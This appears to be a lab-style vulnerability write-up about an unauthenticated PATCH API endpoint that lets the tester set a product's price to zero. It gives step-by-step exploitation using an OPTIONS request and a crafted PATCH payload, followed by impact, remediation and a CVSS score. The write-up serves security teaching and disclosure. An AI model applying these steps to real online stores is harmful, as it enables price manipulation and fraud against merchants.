# Finding and exploiting an unused API endpoint

## Description
The application exposes a functional `PATCH` API endpoint that is not used by the frontend and lacks proper authorization controls. An attacker can modify product attributes, such as price, by sending direct API requests, allowing unauthorized purchases at manipulated prices.

## Steps to Exploit
1. Browse the application and observe product-related API requests.
2. Send a request such as `GET /api/products/1` to Burp Repeater.
3. Change the request method to `OPTIONS`.
4. Observe that `PATCH` is listed in the `Allow` response header.
5. Send a `PATCH` request to update the product price.
6. Add the modified product to the cart and complete the purchase.

## Proof of Concept

### OPTIONS Response
```http
Allow: GET, PATCH
```

### PATCH Request
```http
PATCH /api/products/1 HTTP/1.1
Content-Type: application/json

{
  "price": 0
}
```

### Result
```text
The product price is updated to $0.00 and can be purchased without cost.
```

## Impact
- Unauthorized modification of product pricing.
- Financial losses through free or discounted purchases.
- Exposure of undocumented or unused API functionality.
- Compromise of business logic and data integrity.

## Remediation
1. Require authentication and authorization for all API write operations.
2. Restrict price modification functionality to authorized administrative roles.
3. Disable unnecessary HTTP methods on endpoints that do not require them.
4. Monitor and alert on unusual API method usage and pricing changes.

## CVSS Score
**CVSS v3.1: 7.5 (High)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

## CVSS Justification
- **Attack Vector:** Network – exploitable through direct API requests.
- **Attack Complexity:** Low – requires only a supported HTTP method and crafted payload.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** None – no sensitive information is disclosed.
- **Integrity:** High – attackers can modify product pricing and business data.
- **Availability:** None – no direct impact on service availability.

